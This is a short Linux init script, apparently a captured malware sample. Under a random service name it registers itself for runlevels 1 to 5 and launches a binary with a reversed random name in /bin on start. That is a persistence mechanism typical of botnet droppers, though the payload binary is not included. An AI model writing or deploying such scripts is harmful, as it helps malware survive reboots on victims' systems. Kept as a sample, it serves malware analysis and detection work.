# 20190605sample1_files/rc_S90ygdifyxsgqsjmr
#!/bin/sh
# chkconfig: 12345 90 90
# description: ygdifyxsgqsjmr
### BEGIN INIT INFO
# Provides: ygdifyxsgqsjmr
# Required-Start:
# Required-Stop:
# Default-Start: 1 2 3 4 5
# Default-Stop:
# Short-Description: ygdifyxsgqsjmr
### END INIT INFO
case $1 in
start)
	"/bin/rmjsqgsxyfidgy"
  break
	;;
stop)
  break
	;;
*)
	"/bin/rmjsqgsxyfidgy"
  break
	;;
esac
